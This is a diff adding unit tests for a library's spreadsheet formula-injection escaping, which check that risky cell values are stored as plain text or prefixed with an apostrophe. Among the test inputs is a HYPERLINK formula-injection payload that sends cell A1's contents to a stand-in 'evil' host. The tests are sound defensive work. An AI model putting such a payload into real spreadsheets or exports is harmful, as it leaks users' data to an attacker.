@@ -175,3 +175,39 @@ describe('lib/excel — formula injection escape (QA-021)', () => {
     ]);
   });
 });
+
+describe('lib/excel — typed text, no escape (code review 2026-11-10, finding 30)', () => {
+  const risky = ['@Home Furniture', '- behind the mosque', '=HYPERLINK("http://evil/?x="&A1)', '+1+2', 'Plain'];
+
+  it('with the escape off, every risky value is a string cell with no formula, exactly as given', async () => {
+    const { firstSheetCells } = await import('../support/xlsx-xml');
+    const wb = await buildWorkbook(risky.map((v) => ({ name: v })), 'Test', { escapeFormulas: false });
+    const bytes = new Uint8Array((await wb.xlsx.writeBuffer()) as ArrayBuffer);
+    const cells = firstSheetCells(bytes).filter((c) => /^A\d+$/.test(c.ref) && c.ref !== 'A1');
+    expect(cells.map((c) => c.text)).toEqual(risky);
+    for (const c of cells) {
+      // 's' (shared string) or 'inlineStr': text a spreadsheet shows, never evaluates.
+      expect(['s', 'inlineStr'], c.ref).toContain(c.type);
+      expect(c.formula, c.ref).toBe(false);
+    }
+    // And nowhere in the sheet is there a formula element at all.
+    const { xlsxParts } = await import('../support/xlsx-xml');
+    expect(xlsxParts(bytes).get('xl/worksheets/sheet1.xml')).not.toMatch(/<f[\s>]/);
+  });
+
+  it('with the escape on (the default), the same values still carry the apostrophe', async () => {
+    const wb = await buildWorkbook(risky.map((v) => ({ name: v })), 'Test');
+    const [sheet] = await parseWorkbook((await wb.xlsx.writeBuffer()) as ArrayBuffer);
+    expect(sheet.rows.map((r) => r.name)).toEqual(risky.map((v) => (v === 'Plain' ? v : `'${v}`)));
+  });
+
+  it('typed text never lets an object through that exceljs could write as a formula', async () => {
+    const { typedTextCell } = await import('@/lib/excel');
+    expect(typedTextCell({ formula: 'SUM(A1:A2)' })).toBe('[object Object]');
+    expect(typedTextCell('=1+1')).toBe('=1+1');
+    expect(typedTextCell(12.5)).toBe(12.5);
+    expect(typedTextCell(null)).toBe(null);
+    const d = new Date('2026-11-10T00:00:00Z');
+    expect(typedTextCell(d)).toBe(d);
+  });
+});
